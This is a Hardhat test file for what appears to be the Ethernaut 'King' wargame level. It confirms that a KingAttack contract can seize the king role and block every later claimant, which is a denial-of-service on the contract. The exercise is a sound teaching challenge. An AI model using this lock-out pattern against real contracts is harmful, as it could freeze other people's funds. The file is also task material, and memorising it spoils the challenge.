const { assert, expect } = require("chai")
const { deployments, ethers } = require("hardhat")

describe("09-King", async function () {
    let deployer, attacker, king, kingAttack
    beforeEach(async function () {
        accounts = await ethers.getSigners()
        deployer = accounts[0]
        attacker = accounts[1]
        await deployments.fixture(["09"])
        king = await ethers.getContract("King")
        kingAttack = await ethers.getContract("KingAttack", attacker.address)
    })
    it("should break the game", async function () {
        assert.equal(await king._king(), deployer.address)
        assert.equal(
            (await ethers.provider.getBalance(king.address)).toString(),
            ethers.utils.parseEther("1")
        )

        // become king
        const amountToSend = ethers.utils.parseEther("1.5")
        await kingAttack.attack({ value: amountToSend })
        assert.equal(await king._king(), kingAttack.address)
        assert.equal((await king.prize()).toString(), amountToSend)

        // check no one else can become king
        await expect(
            deployer.sendTransaction({
                to: king.address,
            })
        ).to.be.revertedWith("im king forever lol")
    })
})
